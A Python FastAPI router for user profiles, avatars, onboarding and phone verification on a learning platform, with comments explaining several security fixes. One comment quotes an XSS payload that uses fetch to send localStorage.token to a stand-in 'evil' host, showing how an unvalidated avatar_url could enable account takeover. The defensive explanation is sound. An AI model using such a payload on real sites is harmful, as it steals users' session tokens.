"""
Profile Router — User profile management
"""
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from app.database import get_db
from app.services.name_utils import (ARABIC_NAME_MESSAGE, arabize_first_name,
                                     clean_display_name, compose_full_name,
                                     is_arabic_name, split_full_name)
from app.services.permissions import has_permission
from app.models import User, Channel, Message, MessageType, ChannelType, Post, Payment, PaymentStatus
from app.schemas import UserMemberOut, UserProfileUpdate, OnboardingUpdate
from app.routers.users import get_current_user, get_current_active_member, hash_password, verify_password, issue_token_for
from pydantic import BaseModel
from typing import Optional
from fastapi import UploadFile, File
from datetime import datetime
import os
import uuid
import shutil
from datetime import datetime, timedelta
from app.services.otp_manager import send_otp, verify_otp
from app.models import PhoneOTP
from re import compile as _re_compile
from urllib.parse import urlparse as _urlparse

router = APIRouter(prefix="/profile", tags=["Profile"])


# ─── Avatar upload types ───────────────────────────────────
# The extension an avatar is stored under must come from this map, never from
# the uploaded filename. Both upload endpoints used to do
# `os.path.splitext(file.filename)[1]`, which let the client choose it: send
# evil.html with Content-Type "image/png" — a header the same client writes —
# and the file lands under /uploads/ or /static/ as .html, served from
# ghawy.ai. Anything it runs is same-origin, so it can read the auth token out
# of localStorage and act as whoever opens it, and the chat is right there to
# pass the link around. Deciding the extension here keeps the stored name
# within these three regardless of what was sent.
MAX_AVATAR_BYTES = 5 * 1024 * 1024  # matches /profile/upload-avatar

AVATAR_TYPE_EXTENSIONS = {
    "image/jpeg": ".jpg",
    "image/png": ".png",
    "image/webp": ".webp",
}


# ─── Plan Labels (shared) ──────────────────────────────────
# Deliberately NO price here. This table used to carry an `amount` per plan —
# 10 EGP monthly, 3000 yearly — which was never read by anything (the endpoint
# below reports the amount from the payment row) and had drifted far from what
# the platform actually charges. The one source of truth for prices is
# PLAN_PRICES in app/routers/payment.py; a second copy anywhere is how a page
# ends up advertising one number while the gateway collects another.
PLAN_LABELS = {
    "monthly_egp":   {"label": "شهري",       "currency": "EGP", "days": 30},
    "quarterly_egp": {"label": "تلت شهور",   "currency": "EGP", "days": 90},
    "yearly_egp":    {"label": "سنوي",        "currency": "EGP", "days": 365},
}


# ─── Heartbeat ──────────────────────────────────────────────
@router.post("/heartbeat")
def heartbeat(
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    current_user.last_seen = datetime.utcnow()
    db.commit()
    return {"ok": True}

@router.post("/offline")
def offline(
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    current_user.last_seen = None
    db.commit()
    return {"ok": True}


# ─── Subscription Info ─────────────────────────────────────
@router.get("/subscription-info")
def get_subscription_info(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """
    بيرجع تفاصيل الاشتراك للمستخدم
    """
    # جيب آخر payment مؤكد للمستخدم
    last_payment = db.query(Payment).filter(
        Payment.user_id == current_user.id,
        Payment.status == PaymentStatus.CONFIRMED
    ).order_by(Payment.created_at.desc()).first()

    is_active = current_user.is_active
    subscription_end = current_user.end_at

    # الأيام المتبقية من end_at
    days_remaining = None
    if subscription_end:
        delta = subscription_end - datetime.utcnow()
        days_remaining = max(0, delta.days)

    # عضو مجاني: مفيش أي دفعة مؤكدة (اشتراك مجاني / legacy promo / منحة يدوية).
    # مايتعرضش سعر خالص — يتعرض إنه "مجاني".
    if last_payment is None:
        return {
            "is_active": is_active,
            "is_free": True,
            "plan_key": None,
            "plan_label": "مجاني",
            "amount": None,
            "currency": None,
            "subscription_start": None,
            "subscription_end": subscription_end.isoformat() if subscription_end else None,
            "days_remaining": days_remaining,
            "payment_method": None,
        }

    # عضو دافع: نعرض المبلغ الحقيقي اللي اتدفع فعلاً من سجل الدفع نفسه
    # (مش رقم ثابت من PLAN_LABELS عشان مايبقاش قديم/غلط).
    plan_key = last_payment.plan_key or "monthly_egp"
    plan_info = PLAN_LABELS.get(plan_key, PLAN_LABELS["monthly_egp"])

    # تقدير تاريخ البداية = end_at ناقص مدة الباقة
    subscription_start = None
    if subscription_end:
        subscription_start = subscription_end - timedelta(days=plan_info["days"])

    return {
        "is_active": is_active,
        "is_free": False,
        "plan_key": plan_key,
        "plan_label": plan_info["label"],
        "amount": float(last_payment.amount) if last_payment.amount is not None else None,
        "currency": last_payment.currency or plan_info["currency"],
        "subscription_start": subscription_start.isoformat() if subscription_start else None,
        "subscription_end": subscription_end.isoformat() if subscription_end else None,
        "days_remaining": days_remaining,
        "payment_method": last_payment.method.value,
    }


class ChangePasswordRequest(BaseModel):
    current_password: str
    new_password: str
    confirm_password: str


# ─── Get My Profile ─────────────────────────────────────────
@router.get("/me", response_model=UserMemberOut)
def get_my_profile(
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    # Surface the auto-calculated video-watching streak so the profile card
    # and achievements section show it. Computed fresh, not persisted (no
    # commit), so it never overwrites anything in the DB.
    from app.services.progress_service import calculate_video_streak
    current_user.streak_days = calculate_video_streak(current_user.id, db)
    return current_user


# ─── Update My Profile ──────────────────────────────────────
def _clean_display_text(value: str, limit: int) -> str:
    """Strip markup characters out of a name or bio, and cap the length.

    A display name is echoed into notification bodies ("X reacted to your
    post"), DM previews and member lists, and those land in innerHTML on pages
    all over the site. The rendering side escapes now, which is the real fix —
    this just means a single missed escape somewhere in the frontend is no
    longer a working payload.

    Only the angle brackets go: they are what turns text into markup, and no
    name needs them. Apostrophes stay — "Mu'men", "MOH'D" and their like are
    real members' names, and mangling those to save a character class the
    escaping already handles would be a worse bug than the one being fixed.
    """
    cleaned = (value or "").replace("<", "").replace(">", "")
    return cleaned.strip()[:limit]


# ─── Client-supplied URL validation ────────────────────────
# avatar_url is rendered into src="..." on almost every page of the site, and
# tokens live in localStorage, so a value like
#     x" onerror="fetch('//evil/'+localStorage.token)" x="
# stored here and rendered by the admin member list is an owner-account
# takeover. The render side escapes now (that is the real fix), but a field the
# server will happily store as arbitrary markup should never have been one:
# these are the only shapes a real avatar has ever had.
AVATAR_PATH_RE = _re_compile(r"^/(uploads|static|files)/avatars/[A-Za-z0-9._-]{1,120}$")
AVATAR_ALLOWED_HOSTS = {"ghawy.ai", "www.ghawy.ai"}
SELECTED_AVATAR_RE = _re_compile(r"^[A-Za-z0-9._-]{1,64}\.(png|jpg|jpeg|webp|svg)$")


def _validate_avatar_url(value: str) -> str:
    """A path this server issued, or an https URL on a host we actually use."""
    candidate = (value or "").strip()
    if AVATAR_PATH_RE.match(candidate):
        return candidate
    parsed = _urlparse(candidate)
    if parsed.scheme == "https" and parsed.hostname in AVATAR_ALLOWED_HOSTS:
        return candidate
    raise HTTPException(status_code=422, detail="avatar_url is not a valid avatar location")


def _validate_selected_avatar(value: str) -> str:
    """A preset avatar is a bare filename — never a path and never a URL.

    It is both rendered directly as an image source and interpolated into
    https://ghawy.ai/imgs/avatars/{...}, so "../../x" or a quote character here
    escapes one or the other.
    """
    candidate = (value or "").strip()
    if not SELECTED_AVATAR_RE.match(candidate):
        raise HTTPException(status_code=422, detail="selected_avatar is not a valid preset")
    return candidate


def _validate_social_url(value: str) -> str:
    """http(s) only. escapeHtml on the render side does not stop javascript:."""
    candidate = (value or "").strip()
    if not candidate:
        return ""
    parsed = _urlparse(candidate)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise HTTPException(status_code=422, detail="social_media_url must be an http(s) link")
    return candidate[:500]


@router.put("/me", response_model=UserMemberOut)
def update_my_profile(
    data: UserProfileUpdate,
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    if data.full_name is not None:
        new_name = clean_display_name(data.full_name, limit=80)
        # سقّاطة، مش قاعدة: بنفرض العربي هنا بس لو الاسم المتخزّن عربي أصلاً.
        #
        # `profile.js` بيبعت الفورم كله مع أي حفظ، فـ `full_name` بيترجع مع كل
        # تعديل بايو أو أفاتار أو لينك. قاعدة «عربي دايماً» هنا كانت هترفض
        # حفظ البايو لكل عضو اسمه لاتيني — 1,683 واحد — وهم مالهمش دعوة
        # بالقاعدة دي. بالشكل ده: اسم عربي مايرجعش لاتيني، واسم لاتيني يفضل
        # شغال زي النهارده ولسه ينفع يتصلّح فيه غلطة إملائية.
        if is_arabic_name(current_user.full_name) and not is_arabic_name(new_name):
            raise HTTPException(status_code=422, detail=ARABIC_NAME_MESSAGE)
        current_user.full_name = new_name
        # Keep the split columns in step with the display name.
        current_user.first_name, current_user.last_name = split_full_name(current_user.full_name)
    if data.bio is not None:
        current_user.bio = _clean_display_text(data.bio, limit=500)
    if data.avatar_url is not None:
        current_user.avatar_url = _validate_avatar_url(data.avatar_url)
    if data.social_media_url is not None:
        current_user.social_media_url = _validate_social_url(data.social_media_url)
    if data.show_social_media is not None:
        current_user.show_social_media = data.show_social_media

    db.commit()
    db.refresh(current_user)
    return current_user


# ─── Avatar image optimization ─────────────────────────────
AVATAR_MAX_DIM = 512

def optimize_avatar(filepath: str) -> None:
    """Downscale + recompress an uploaded avatar in place.

    Avatars render at ≤80px but users upload multi-MB camera photos; a raw
    2.5MB PNG was being shipped to every chat/member-list viewer.
    Best-effort: on any failure the original file is kept as-is.
    """
    try:
        from PIL import Image, ImageOps
        with Image.open(filepath) as img:
            img = ImageOps.exif_transpose(img)
            img.thumbnail((AVATAR_MAX_DIM, AVATAR_MAX_DIM), Image.LANCZOS)
            fmt = (img.format or "").upper()
            if filepath.lower().endswith((".jpg", ".jpeg")):
                img.convert("RGB").save(filepath, "JPEG", quality=85, optimize=True)
            elif filepath.lower().endswith(".webp"):
                img.save(filepath, "WEBP", quality=85)
            else:
                img.save(filepath, optimize=True)
    except Exception:
        pass


# ─── Upload Avatar ─────────────────────────────────────────
@router.post("/avatar")
def upload_avatar(
    file: UploadFile = File(...),
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    ext = AVATAR_TYPE_EXTENSIONS.get(file.content_type)
    if ext is None:
        raise HTTPException(status_code=400, detail="Only JPG, PNG, WEBP files allowed")

    # Create directory if it doesn't exist
    upload_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "uploads", "avatars")
    os.makedirs(upload_dir, exist_ok=True)

    # Generate unique filename — extension from the map, not from file.filename
    filename = f"{uuid.uuid4().hex}{ext}"
    filepath = os.path.join(upload_dir, filename)

    # Copy with a bound rather than shutil.copyfileobj, which would happily
    # write whatever was sent — nginx's client_max_body_size 50M was the only
    # limit, so this route was a disk-fill with no rate limit in front of it.
    # The sibling /profile/upload-avatar has always capped at 5 MB; match it.
    written = 0
    try:
        with open(filepath, "wb") as buffer:
            while True:
                chunk = file.file.read(64 * 1024)
                if not chunk:
                    break
                written += len(chunk)
                if written > MAX_AVATAR_BYTES:
                    raise HTTPException(status_code=413, detail="Avatar must be 5 MB or smaller")
                buffer.write(chunk)
    except HTTPException:
        # Don't leave the partial file behind on the way out.
        try:
            os.remove(filepath)
        except OSError:
            pass
        raise
    optimize_avatar(filepath)

    avatar_url = f"/uploads/avatars/{filename}"
    current_user.avatar_url = avatar_url
    db.commit()
    db.refresh(current_user)

    return {"avatar_url": avatar_url}


def _arabic_name_suggestion(full_name: str | None) -> str:
    """`Mohamed Salah` → `محمد Salah`. `""` لو الاسم الأول مش في الماب.

    الفكرة إن العضو يصلّح كلمة بدل ما يكتب اسمه من الأول — ده اللي الـ ٢٥٠ اسم
    اللي في الماب بيعملوه هنا. بيرجع نص للعرض بس: اللي بيتخزّن هو اللي العضو
    بيبعته بعد ما يشوفه، مش ده.
    """
    ar = arabize_first_name(full_name or "")
    if not ar:
        return ""
    _first, last = split_full_name(full_name)
    return compose_full_name(ar, last)


def _needs_arabic_name(user: User) -> bool:
    """هل نسأل العضو ده يكتب اسمه بالعربي؟

    الشرط على الاسم نفسه مش على طريقة التسجيل. حالة واحدة نفكر فيها بدل
    اتنين، وبتمسك كمان أي حساب اتعمل من فورم وعدّى بطريقة ما.
    """
    return not user.latin_name_ok and not is_arabic_name(user.full_name)


# ─── Onboarding Status ────────────────────────────────────
@router.get("/onboarding-status")
def get_onboarding_status(current_user: User = Depends(get_current_active_member)):
    needs = _needs_arabic_name(current_user)
    return {
        "onboarding_completed": bool(current_user.onboarding_completed),
        "needs_arabic_name": needs,
        "suggested_name": _arabic_name_suggestion(current_user.full_name) if needs else "",
        "current_name": current_user.full_name or "",
    }


# ─── Complete Onboarding ──────────────────────────────────
@router.post("/complete-onboarding")
def complete_onboarding(
    data: OnboardingUpdate,
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    # الاسم بالعربي أول حاجة، قبل أي تعديل تاني: لو اترفض، مفيش نص تغيير
    # اتساب وراه على الحساب.
    #
    # مفيش رفض للإنهاء نفسه لو الاسم ماجاش خالص. الصفحة هي اللي بتسأل، والعضو
    # اللي وصله كلاينت قديم مايتقفلش برّه حسابه عشان كده — يفضل باسمه اللاتيني،
    # وهي نفس نتيجة إنه يعلّم «اسمي مش بالعربي».
    if data.latin_name_ok:
        current_user.latin_name_ok = True
    elif data.full_name is not None and data.full_name.strip():
        new_name = clean_display_name(data.full_name, limit=80)
        if not is_arabic_name(new_name):
            raise HTTPException(status_code=422, detail=ARABIC_NAME_MESSAGE)
        current_user.full_name = new_name
        current_user.first_name, current_user.last_name = split_full_name(new_name)

    # Update birth_date
    if data.birth_date:
        try:
            parts = data.birth_date.split("/")
            if len(parts) == 3:
                from datetime import date as date_type
                current_user.birth_date = date_type(int(parts[2]), int(parts[1]), int(parts[0]))
        except (ValueError, IndexError):
            pass  # skip invalid date

    # Update social media
    if data.social_media_url:
        current_user.social_media_url = _validate_social_url(data.social_media_url)

    # Update avatar
    if data.avatar_url:
        current_user.avatar_url = _validate_avatar_url(data.avatar_url)
    if data.selected_avatar:
        preset = _validate_selected_avatar(data.selected_avatar)
        current_user.selected_avatar = preset
        # Auto-set avatar_url from preset if no upload was provided
        if not data.avatar_url:
            current_user.avatar_url = f"https://ghawy.ai/imgs/avatars/{preset}"

    # Mark onboarding as completed
    current_user.onboarding_completed = True
    db.commit()

    # Create "Start Here" welcome message
    start_here_ch = db.query(Channel).filter(Channel.name == "start-here").first()
    if start_here_ch:
        welcome_msg = Message(
            channel_id=start_here_ch.id,
            sender_id=current_user.id,
            content="Welcome to Ghawy! 🎉 Start by watching the introductory video in the Start Here section.",
            message_type=MessageType.TEXT,
        )
        db.add(welcome_msg)
        db.commit()

    return {"success": True, "redirect": "dashboard.html"}


# ─── Upload Avatar (Onboarding) ──────────────────────────
@router.post("/upload-avatar")
def upload_avatar_onboarding(
    file: UploadFile = File(...),
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    ext = AVATAR_TYPE_EXTENSIONS.get(file.content_type)
    if ext is None:
        raise HTTPException(status_code=400, detail="Only JPG, PNG, WEBP files allowed")

    # Check file size (5MB max)
    file.file.seek(0, 2)
    size = file.file.tell()
    file.file.seek(0)
    if size > 5 * 1024 * 1024:
        raise HTTPException(status_code=400, detail="File size must be under 5MB")

    # Save to static/avatars
    static_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "static", "avatars")
    os.makedirs(static_dir, exist_ok=True)

    # Extension from the validated content type, not from file.filename
    filename = f"{current_user.id}{ext}"
    filepath = os.path.join(static_dir, filename)

    with open(filepath, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    optimize_avatar(filepath)

    avatar_url = f"/static/avatars/{filename}"
    current_user.avatar_url = avatar_url
    db.commit()

    return {"avatar_url": avatar_url}


# ─── Get Public Profile ────────────────────────────────────
@router.get("/{user_id}/public")
def get_public_profile(
    user_id: int,
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    from datetime import timedelta
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    # A display handle, derived from the name the member chose to show. It used
    # to be user.email.split("@")[0], which handed the local-part of every
    # member's address to any other member who opened their profile card —
    # enough to guess the address itself for the common provider patterns.
    username = _public_handle(user)

    # Joined date
    months_en = {1:"January",2:"February",3:"March",4:"April",5:"May",6:"June",
                 7:"July",8:"August",9:"September",10:"October",11:"November",12:"December"}
    joined_at = ""
    if user.created_at:
        joined_at = f"Joined {months_en.get(user.created_at.month, '')} {user.created_at.year}"

    # Online status (heartbeat-based: last_seen within 60 seconds)
    is_online = False
    if user.last_seen is not None:
        is_online = (datetime.utcnow() - user.last_seen).total_seconds() < 60

    # Post count (community posts by this user)
    post_count = db.query(Post).filter(Post.user_id == user_id).count()

    # Live day-streak. The stored `streak_days` column is only refreshed when a
    # user opens their OWN profile, so for anyone else it is stale/0 — compute it
    # fresh here so the profile panel's "Day Streak" always reflects reality.
    from app.services.progress_service import calculate_video_streak
    streak_days = calculate_video_streak(user_id, db)

    # Achievement unlock flags for the viewed member (shared with dashboard).
    from app.routers.dashboard import compute_user_achievements
    achievements = compute_user_achievements(user_id, db)

    return {
        "id": user.id,
        "full_name": user.full_name,
        "username": username,
        "avatar_url": user.avatar_url,
        "selected_avatar": getattr(user, "selected_avatar", None),
        "bio": user.bio,
        "social_media_url": getattr(user, "social_media_url", None) if getattr(user, "show_social_media", True) else None,
        "show_social_media": getattr(user, "show_social_media", True),
        "level": getattr(user, "level", 1) or 1,
        "xp": getattr(user, "xp", 0) or 0,
        "badge": getattr(user, "badge", "Member") or "Member",
        "streak_days": streak_days,
        "joined_at": joined_at,
        "post_count": post_count,
        "is_online": is_online,
        "is_admin": user.is_admin,
        "custom_title": user.custom_title or "",
        **achievements,
    }


# ─── Get Any Member Profile ────────────────────────────────
@router.get("/{user_id}", response_model=UserMemberOut)
def get_member_profile(
    user_id: int,
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    """One member's profile card, for a signed-in member.

    This took no token at all and returned `email` in the body, so walking
    /profile/1, /profile/2, … dumped the address of every person who has ever
    registered — together with their is_admin/is_owner flags, which named the
    accounts worth attacking. Nothing in the frontend ever called it: the
    profile panel, the chat popovers and the AI-updates cards all use
    /profile/{id}/public, which has always required a member and has never
    carried an address.

    An address is still returned to the person it belongs to and to staff,
    since the team dashboard reasonably shows one. For everyone else the field
    is dropped rather than the request refused — a member looking at another
    member's card is normal, learning their email is not.
    """
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    # "طاقم" هنا مش أي أدمن: الإيميل ده بالظبط اللي صلاحية member-contacts
    # بتحجبه في تاب الأعضاء، وأدمن متقفولة عنه كان لسه يقدر يعدّي على
    # /profile/1, /profile/2 … وياخده واحد واحد.
    sees_contacts = has_permission(current_user, "member-contacts")
    if user.id == current_user.id or sees_contacts:
        return user

    out = UserMemberOut.model_validate(user)
    out.email = None
    out.permissions = []   # صلاحيات الفريق شغل الفريق، مش بيانات كارت العضو
    return out


def _public_handle(user: User) -> str:
    """A non-identifying handle for a profile card: a slug of the display name.

    Falls back to the user id, never to anything derived from the address.
    """
    import re as _re
    slug = _re.sub(r"[^a-z0-9]+", "", (user.full_name or "").lower())[:24]
    return slug or f"user{user.id}"


# ─── Change Password ────────────────────────────────────────
@router.post("/change-password")
def change_password(
    data: ChangePasswordRequest,
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db),
):
    if data.new_password != data.confirm_password:
        raise HTTPException(status_code=400, detail="Passwords don't match")

    if len(data.new_password) < 6:
        raise HTTPException(status_code=400, detail="Password too short")

    # Google users can't change password
    if current_user.hashed_password.startswith("google_oauth_"):
        raise HTTPException(status_code=400, detail="Google accounts can't change password")

    if not verify_password(data.current_password, current_user.hashed_password):
        raise HTTPException(status_code=400, detail="Current password is wrong")

    current_user.hashed_password = hash_password(data.new_password)
    # Changing a password must end the sessions that were opened with the old
    # one — otherwise "someone knows my password" has no remedy, because the
    # 30-day token they already hold keeps working regardless.
    current_user.token_version = (current_user.token_version or 0) + 1
    db.commit()
    # …including this one, so hand back a fresh token rather than logging the
    # member out of the tab they just used.
    return {
        "message": "Password changed successfully",
        "access_token": issue_token_for(current_user),
    }


# ─── Phone Verification (Vonage) ────────────────────────────
from app.schemas import SendPhoneOTP, VerifyPhoneOTP

@router.post("/send-phone-otp")
async def send_phone_otp(
    req: SendPhoneOTP,
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db)
):
    """
    يبعت OTP على الرقم المدخل
    """
    import re as _re
    phone = req.phone.strip()

    # Accept Egyptian local format (01XXXXXXXXX) OR international E.164 (+XXXXXXXXXXX)
    # E.164: starts with +, followed by 7–15 digits (ITU-T E.164 standard)
    _cleaned = _re.sub(r'[\s\-\(\)]', '', phone)
    _is_egypt_local = _cleaned.startswith('01') and len(_cleaned) == 11 and _cleaned.isdigit()
    _is_e164 = bool(_re.match(r'^\+\d{7,15}$', _cleaned))
    if not (_is_egypt_local or _is_e164):
        raise HTTPException(status_code=400, detail="Invalid phone number")
    # Use the cleaned version for the rest of the function
    phone = _cleaned

    # Check if number is used
    existing = db.query(User).filter(
        User.phone == phone,
        User.id != current_user.id
    ).first()
    if existing:
        raise HTTPException(status_code=400, detail="This number is registered to another account")

    success = await send_otp(phone, db=db, user_id=current_user.id)
    if not success:
        raise HTTPException(status_code=500, detail="Failed to send code, try again")

    return {"message": "Code sent to your number"}


@router.post("/verify-phone-otp")
async def verify_phone_otp(
    req: VerifyPhoneOTP,
    current_user: User = Depends(get_current_active_member),
    db: Session = Depends(get_db)
):
    """
    يتحقق من الكود ويحفظ الرقم في الـ DB
    """
    success = await verify_otp(req.phone, req.code, db=db)

    if not success:
        raise HTTPException(status_code=400, detail="Invalid code or expired")

    # Save number
    current_user.phone = req.phone
    db.commit()

    return {"message": "Phone verified successfully ✅"}
